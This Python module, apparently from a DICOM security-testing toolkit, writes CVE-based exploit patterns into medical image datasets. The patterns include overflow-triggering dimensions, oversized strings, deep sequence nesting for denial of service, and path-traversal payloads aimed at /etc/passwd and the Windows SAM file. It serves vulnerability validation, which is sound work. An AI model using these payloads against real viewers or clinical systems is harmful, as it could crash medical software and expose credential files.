"""Exploit Pattern Applicator - Applies known CVE patterns to DICOM files.

This module applies known vulnerability patterns to DICOM files for security
validation testing. Unlike fuzzing (which discovers unknown bugs through random
mutations), this applies specific exploit patterns based on published CVEs.

CVEs Covered:
- CVE-2025-5943: Heap buffer overflow via large dimensions
- CVE-2025-11266: Integer underflow in encapsulated PixelData
- CVE-2020-29625: DoS via malformed length fields
- CVE-2021-41946: Path traversal via filename injection
- CVE-2022-24193: DoS via deep sequence nesting
- CVE-2019-11687: Polyglot files (handled at binary level)

Note: Some CVE patterns require binary-level modifications and are applied
during file writing. This module applies Dataset-level mutations that
trigger the same vulnerability patterns.
"""

import logging
import random

from pydicom.dataset import Dataset
from pydicom.sequence import Sequence
from pydicom.tag import Tag
from pydicom.uid import UID

logger = logging.getLogger(__name__)


class ExploitPatternApplicator:
    """Applies known CVE-based exploit patterns to DICOM datasets.

    This is NOT fuzzing - it applies specific, known vulnerability patterns
    to test if a viewer is susceptible to published CVEs. Use this for
    vulnerability validation, not bug discovery.

    For actual fuzzing (discovering unknown bugs), use the robustness
    strategies: metadata, header, pixel, structure.
    """

    def __init__(self) -> None:
        """Initialize exploit pattern applicator with pattern registry."""
        self.patterns_applied: list[str] = []

    def apply_exploit_patterns(self, dataset: Dataset) -> Dataset:
        """Apply random CVE-based exploit patterns to dataset.

        Args:
            dataset: DICOM dataset to modify

        Returns:
            Modified dataset with exploit patterns applied

        """
        # List of available CVE patterns
        patterns = [
            ("CVE-2025-5943:heap_overflow", self._heap_overflow_dimensions),
            ("CVE-2025-5943:integer_overflow", self._integer_overflow_dimensions),
            ("CVE-2020-29625:malformed_length", self._malformed_string_lengths),
            ("CVE-2021-41946:path_traversal", self._path_traversal),
            ("CVE-2022-24193:deep_nesting", self._deep_nesting),
            ("CVE-2019-11687:polyglot_marker", self._polyglot_marker),
            ("CVE-2025-11266:pixel_fragment", self._pixel_data_fragment_attack),
            ("GENERIC:invalid_transfer_syntax", self._invalid_transfer_syntax),
        ]

        # Apply 1-3 random patterns
        num_patterns = random.randint(1, 3)
        selected = random.sample(patterns, min(num_patterns, len(patterns)))

        for name, pattern_func in selected:
            try:
                dataset = pattern_func(dataset)
                self.patterns_applied.append(name)
                logger.debug(f"Applied exploit pattern: {name}")
            except Exception as e:
                logger.debug(f"Exploit pattern {name} failed: {e}")

        return dataset

    def _heap_overflow_dimensions(self, dataset: Dataset) -> Dataset:
        """CVE-2025-5943: Set extreme image dimensions to trigger heap overflow.

        When Rows * Columns * BitsAllocated/8 exceeds allocation, parsers
        may overflow heap buffers during pixel data processing.
        """
        # Set maximum dimensions to trigger large allocations
        dataset.Rows = 65535
        dataset.Columns = 65535
        dataset.BitsAllocated = 16
        dataset.BitsStored = 16
        dataset.HighBit = 15
        dataset.SamplesPerPixel = 1

        return dataset

    def _integer_overflow_dimensions(self, dataset: Dataset) -> Dataset:
        """CVE-2025-5943: Set dimensions that cause integer overflow.

        Values chosen so that Rows * Columns overflows 32-bit integers.
        """
        overflow_pairs = [
            (32768, 32768),  # 32768^2 = 1073741824 (fits), but *2 bytes = overflow
            (46341, 46341),  # ~2^31 when multiplied
            (65535, 65535),  # Maximum 16-bit values
        ]

        rows, cols = random.choice(overflow_pairs)
        dataset.Rows = rows
        dataset.Columns = cols
        dataset.BitsAllocated = 16

        return dataset

    def _malformed_string_lengths(self, dataset: Dataset) -> Dataset:
        """CVE-2020-29625: Insert extremely long strings to trigger buffer issues.

        Parsers may allocate fixed-size buffers for certain string fields.
        """
        # Create strings that exceed typical buffer sizes
        long_string_2k = "A" * 2048
        long_string_32k = "X" * 32768

        # Apply to various string fields
        if hasattr(dataset, "PatientName"):
            dataset.PatientName = long_string_2k
        if hasattr(dataset, "InstitutionName"):
            dataset.InstitutionName = long_string_32k
        if hasattr(dataset, "StudyDescription"):
            dataset.StudyDescription = long_string_2k
        if hasattr(dataset, "SeriesDescription"):
            dataset.SeriesDescription = long_string_32k

        # Also set some private tags with long values
        dataset.add_new(Tag(0x0009, 0x0010), "LO", long_string_32k)
        dataset.add_new(Tag(0x0043, 0x0010), "LO", long_string_32k)

        return dataset

    def _path_traversal(self, dataset: Dataset) -> Dataset:
        """CVE-2021-41946: Inject path traversal payloads in file references."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "\\\\server\\share\\file",
        ]

        payload = random.choice(payloads)

        # Use LO (Long String) VR which allows more characters than CS
        # Private tags can have any VR
        dataset.add_new(Tag(0x0009, 0x1001), "LO", payload)  # Private path field

        # Also try in StorageMediaFileSetID which uses SH VR (allows paths)
        try:
            dataset.StorageMediaFileSetID = payload[:16]  # SH max 16 chars
        except Exception as e:
            logger.debug(f"Could not set StorageMediaFileSetID: {e}")

        return dataset

    def _deep_nesting(self, dataset: Dataset) -> Dataset:
        """CVE-2022-24193: Create deeply nested sequences to exhaust stack."""
        nesting_depth = random.randint(50, 200)

        # Build a deeply nested sequence structure
        inner_dataset = Dataset()
        inner_dataset.PatientName = "Nested"

        for _ in range(nesting_depth):
            wrapper = Dataset()
            wrapper.add_new(Tag(0x0008, 0x1115), "SQ", Sequence([inner_dataset]))
            inner_dataset = wrapper

        # Add the deeply nested structure
        dataset.add_new(Tag(0x0008, 0x1115), "SQ", Sequence([inner_dataset]))

        return dataset

    def _polyglot_marker(self, dataset: Dataset) -> Dataset:
        """CVE-2019-11687: Add markers indicating polyglot potential.

        The actual PE/ELF header injection happens at binary level during save.
        This mutation adds metadata markers and modifies preamble-related fields.
        """
        # Add a marker in file meta info if available
        if hasattr(dataset, "file_meta"):
            # Set implementation class UID to something suspicious
            dataset.file_meta.ImplementationClassUID = UID("1.2.3.4.5.6.7.8.9.0.MZ")

        # Add private tag indicating polyglot test
        dataset.add_new(Tag(0x0009, 0x1000), "LO", "POLYGLOT_TEST_MARKER")

        return dataset

    def _pixel_data_fragment_attack(self, dataset: Dataset) -> Dataset:
        """CVE-2025-11266: Manipulate pixel data attributes for fragment attacks.

        Sets up conditions that may trigger integer underflow in encapsulated
        pixel data parsing by creating mismatched frame counts and dimensions.
        """
        # Set conflicting frame information
        dataset.NumberOfFrames = 10
        dataset.Rows = 1
        dataset.Columns = 1
        dataset.BitsAllocated = 8

        # Add encapsulated-related attributes
        if hasattr(dataset, "file_meta"):
            # Set to JPEG transfer syntax (encapsulated)
            dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")

        return dataset

    def _invalid_transfer_syntax(self, dataset: Dataset) -> Dataset:
        """Inject invalid transfer syntax UID to test parser robustness."""
        invalid_uids = [
            "1.2.3.4.5.6.7.8.9.0" + "." * 50,  # Excessively long
            "0.0",  # Minimal
            "1.2.840.10008.1.2.4.9999",  # Non-existent JPEG variant
            "INVALID.TRANSFER.SYNTAX",  # Non-numeric
        ]

        if hasattr(dataset, "file_meta"):
            dataset.file_meta.TransferSyntaxUID = UID(random.choice(invalid_uids))

        return dataset

    def get_patterns_applied(self) -> list[str]:
        """Return list of patterns applied in last call."""
        return self.patterns_applied.copy()

    def reset_stats(self) -> None:
        """Reset pattern tracking."""
        self.patterns_applied = []

    # Backward compatibility aliases
    def apply_cve_mutations(self, dataset: Dataset) -> Dataset:
        """Deprecated: Use apply_exploit_patterns instead."""
        return self.apply_exploit_patterns(dataset)

    def get_mutations_applied(self) -> list[str]:
        """Deprecated: Use get_patterns_applied instead."""
        return self.get_patterns_applied()

    @property
    def mutations_applied(self) -> list[str]:
        """Deprecated: Use patterns_applied instead."""
        return self.patterns_applied

    @mutations_applied.setter
    def mutations_applied(self, value: list[str]) -> None:
        """Deprecated: Use patterns_applied instead."""
        self.patterns_applied = value


# Backward compatibility alias
CVEFuzzer = ExploitPatternApplicator
